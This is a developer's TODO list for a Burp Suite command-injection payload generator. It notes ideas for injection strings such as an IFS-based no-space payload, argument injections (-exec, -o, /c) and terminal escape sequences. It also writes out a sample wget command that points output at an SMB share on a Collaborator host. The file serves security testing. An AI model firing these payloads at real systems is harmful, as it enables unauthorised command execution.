SHELLING TODO
--------------------------------
Fuckups that should not have happened:
	- fix the fucking false negatives	

OS-specific improvements:	
	- nix: https://security.szurek.pl/exploit-bypass-php-escapeshellarg-escapeshellcmd.html#known-bypassesexploits
	- nix: introduce terminal injection payloads (escape sequences) like this one https://www.exploit-db.com/exploits/33504/
	- nix: Introduce this IFS=,;`cat<<<uname,-a` by https://twitter.com/MrHappiey
	- nix: -exec, -e, -r and other argument injections for direct code execution are encouraged ;]
	- nix: -o, -O and -out are also good outputfile candidates in nix, the problem is we don't have UNC support... or do we?
		we have to figure out something like:
		wget http://wp.pl -O smb://fdwi7155tpq9htil8kigfkgfh6nwbl.burpcollaborator.net/share/public/file.txt
		
	- nix: also, consider injections into sh expressions (?)
	- win: the windows argument injection pattern /c "command" I "figured out" after reading the recently released reference
	- win: additional argument separators for windows: ;-_,=/ (find out compatible commands, as echo/type are fine, while ping fails)
	- win: check that obfuscation trick from Daniel's presentation (and prolly do more research on the subject)
	- win: how about detecting command/argument injections by using > as the param separator... and UNC \\<PAYLOAD_MARK.COLLAB\ as its argument? ;]
		- how about /out or /o counterpart (arg injection) of this?
		- I believe we can improve the efficiency we discover argument injections... because we don't do it at all, do we? xD


Improve the payload set:
	- profiles (make a very good-effort, but optimized, default payload list) - e.g. nospace to focus on no-space only
	- check the paylaod set for incorrect payloads (ones that do not make sense -> will always fail)

Give the user the ability to mute the debug output maybe (especially the collab session tracking algorithm)?

Update the fucking documentation

Make sure the thing is BappSec-friendly :P

Make sure the menu does not fuck up under lower resolutions (I am pretty sure it still does)

BTW: The worst thing about Burp Collaborator is the payload length; much better to have a private instance at a domain as short as possible. Also, for private use, the length of the domain identifier could be much shorter (in most cases one byte would do the trick).
